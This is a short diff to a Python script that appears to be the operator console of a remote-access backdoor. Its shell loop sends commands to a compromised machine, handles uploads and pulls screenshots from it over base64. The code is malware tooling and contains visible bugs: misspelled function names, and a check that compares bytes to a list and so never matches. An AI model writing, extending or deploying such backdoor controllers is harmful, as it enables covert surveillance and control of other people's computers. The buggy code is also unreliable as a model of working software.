@@ -21,6 +21,7 @@ def reliable_recv():
 
 
 def shell():
+	global count
 	while True:
 		command = input("* Shell#-%s: " % str(ip))
 		print("Commansd came %s " % str(command))
@@ -42,7 +43,7 @@ def shell():
 				failed = "failed to upload "
 				relibale_send(base64.b64encode(failed))
 		elif command[:10] == "screenshot":
-			with open("screenhot%d" % count, "wb") as screen:
+			with open("screenhot%d" %count, "wb") as screen:
 				image = reliable_recv()
 				image_decoded = base64.b64decode(image)
 				if image_decoded[:4] == ["[!!]"]:
